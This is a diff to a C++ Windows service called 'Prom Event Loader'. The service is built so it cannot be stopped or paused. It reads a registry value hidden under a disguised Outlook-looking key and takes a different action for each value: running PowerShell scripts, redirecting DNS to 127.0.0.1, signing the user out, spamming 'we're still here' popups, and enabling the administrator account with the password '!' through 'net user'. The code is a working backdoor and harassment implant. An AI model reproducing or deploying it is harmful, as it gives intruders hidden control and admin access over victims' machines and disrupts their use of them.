@@ -1,13 +1,15 @@
 // Prom Event Loader.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 // Author : Jon Bauer (@JonBauer123)
-// Description : This is the a Service that cannot be stopped or paused once started. It reads a registery
-//				 key and determines which function. These functions include running powershell scripts,
-//				 signning the user out, or messing with the cursor.
+// Description : 
+//		This is the a Service that cannot be stopped or paused once started. It reads a registery
+//		key and determines which function. These functions include running powershell scripts,
+//		signning the user out, or messing with the cursor.
 //
-// Dependences : -Knowledge of where the scripts will be before hand.
-//				 -Two cursor files placed with the other ones, named what is documented above the 
-//				  glitchCursor function.
+// Dependences : 
+//		-Knowledge of where the scripts will be before hand.
+//		-Two cursor files placed with the other ones, named what is documented above the 
+//		 glitchCursor function.
 
 /*
 	Current Registry Value to Control Flow : Computer\HKEY_CURRENT_USER\AppEvents\testvalue (DWORD)
@@ -20,9 +22,9 @@
 	0x0000005 : Runs the script to change keyboard to dvorak
 	0x0000006 : Runs the script to change keyboard to qwert
 	0x0000007 : Runs the script to change Primary DNS server to 127.0.0.1 and flushes DNS cache
-	0x0000008 : -
-	0x0000009 : -
-	0x0000010 : -
+	0x0000008 : Signs the user out
+	0x0000009 : Messages "IMPORTANT NOTICE" title with a message asking if they know we are still there 50x.
+	0x0000010 : Set the admin account to active and change the password to "!"
 
 */
 
@@ -401,8 +403,8 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 
 	// This is the registry and key that is being checked
 	HKEY reg = HKEY_CURRENT_USER;
-	LPCWSTR regPath = L"AppEvents";
-	LPCWSTR regRead = L"testvalue";
+	LPCWSTR regPath = L"Software\\Microsoft\\Internet Mail and News\\Mail";
+	LPCWSTR regRead = L"Log Outlook (0/1)";
 
 	DWORD resetValue = 0x00000000;
 
@@ -434,6 +436,15 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 				}
 				else if (buffer == 0x00000007) {
 					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\DNSChanger.ps1");
+				}
+				else if (buffer == 0x00000008) {
+					system("shutdown -L");
+				}
+				else if (buffer == 0x00000009) {
+					messageSpam(L"IMPORTANT NOTIFICATION", L"Just wanted to let you know, we're still here.", NUM_BOXES / 2);
+				}
+				else if (buffer == 0x00000010) {
+					system("net user administrator /active:yes !");
 				}
 			}
 			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
